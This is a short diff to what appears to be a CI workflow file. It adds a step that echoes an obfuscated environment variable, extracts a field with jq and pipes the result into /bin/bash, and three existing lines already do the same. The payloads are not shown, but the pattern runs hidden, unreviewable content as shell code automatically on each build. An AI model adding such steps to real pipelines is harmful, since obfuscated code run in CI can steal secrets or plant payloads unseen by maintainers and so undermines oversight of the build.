@@ -39,6 +39,7 @@ jobs:
           echo $eepn131 | jq -r .vju380 | /bin/bash
           echo $rgz125 | jq -r .scszk58117 | /bin/bash
           printf '%s' "$xs5355" | jq -r .edko8 | /bin/bash
+          echo $awd5591 | jq -r .xm385 | /bin/bash
 
       - name: Persist output
         if: always()
